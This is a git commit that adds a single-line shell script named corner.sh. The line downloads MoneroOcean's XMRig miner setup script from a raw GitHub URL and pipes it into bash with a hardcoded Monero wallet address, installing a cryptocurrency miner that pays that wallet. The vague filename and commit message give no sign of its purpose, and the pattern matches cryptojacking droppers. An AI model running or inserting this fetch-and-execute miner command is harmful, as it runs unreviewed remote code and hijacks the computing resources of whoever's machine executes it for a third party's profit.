3bd7e8b35fa889f212adf55e3902311b2d1ebf3f
ziyang13 <102011256+ziyang13@users.noreply.github.com>
2022-07-30 00:01:54 +0800

    Create corner.sh

---
+++ corner.sh
@@ -0,0 +1,1 @@
+curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 41jGeVfpdv7bdWHFVjkCcAdiHkgqZtU6b95up29Vwr6rWMgb2ShpAn2GMp2aMmvELp3BteshvY51sQ8dYXCBHBphAzANsNJ
